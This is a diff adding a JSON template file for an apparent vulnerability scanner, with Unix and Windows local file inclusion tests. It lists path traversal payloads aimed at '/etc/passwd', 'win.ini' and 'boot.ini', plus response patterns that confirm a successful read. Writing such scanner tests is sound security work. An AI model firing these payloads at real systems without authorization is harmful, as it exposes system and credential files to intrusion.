@@ -1,0 +1,101 @@
+[
+  {
+    "id": "lfi-basic",
+    "info": {
+      "name": "Local File Inclusion - Basic Tests",
+      "severity": "high",
+      "category": "file-inclusion",
+      "description": "Tests for local file inclusion vulnerabilities",
+      "references": [
+        "https://owasp.org/www-community/attacks/Path_Traversal"
+      ],
+      "tags": [
+        "lfi",
+        "file-inclusion",
+        "path-traversal"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "../../etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "../../../etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "....//....//....//etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "/etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "file:///etc/passwd",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "root:x:",
+          "/bin/bash",
+          "/bin/sh"
+        ]
+      }
+    ]
+  },
+  {
+    "id": "lfi-windows",
+    "info": {
+      "name": "Local File Inclusion - Windows",
+      "severity": "high",
+      "category": "file-inclusion",
+      "description": "Tests for LFI on Windows systems",
+      "references": [
+        "https://owasp.org/www-community/attacks/Path_Traversal"
+      ],
+      "tags": [
+        "lfi",
+        "windows"
+      ]
+    },
+    "payloads": [
+      {
+        "value": "..\\..\\..\\windows\\win.ini",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "C:\\windows\\win.ini",
+        "encoding": "none",
+        "method": "GET"
+      },
+      {
+        "value": "..\\..\\..\\boot.ini",
+        "encoding": "none",
+        "method": "GET"
+      }
+    ],
+    "matchers": [
+      {
+        "type": "response_body",
+        "condition": "contains",
+        "patterns": [
+          "[extensions]",
+          "[fonts]",
+          "boot loader"
+        ]
+      }
+    ]
+  }
+]
